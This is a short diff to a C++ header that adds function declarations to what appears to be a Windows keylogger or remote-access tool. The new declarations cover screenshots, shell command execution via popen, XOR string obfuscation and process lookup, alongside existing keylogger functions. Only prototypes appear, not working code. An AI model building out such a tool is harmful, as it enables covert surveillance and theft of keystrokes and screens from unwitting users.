@@ -76,4 +76,18 @@ void WriteLog(string filename, const char* key);
 void WriteLogChar(string filename, char key);
 int keylistener(string FILENAME_LOG, int key);
 int keylogger_spawn(string FILENAME_LOG);
+vector<string> split(const string& s, char delim);
+string path_link(string link);
+bool endswith(const std::string& str, const std::string& suffix);
+bool startswith(const std::string& str, const std::string& prefix);
+vector<int> GetScreenResolution(int& horizontal, int& vertical);
+bool saveBitmap(LPCSTR filename, HBITMAP bmp, HPALETTE pal);
+bool screenshot(int x, int y, int w, int h, LPCSTR fname);
+char* cmd_popen_char(const char* command, const char* mode, char* buffer);
+char* pwd(char *buffer);
+string tohex(string buffer);
+string xor_string_enc_dec(string data, char key[]);
+int xor_logic(int a, int b);
+bool bool_xor_logic(bool a, bool b);
+int getpid(const string& process_name);
 ```
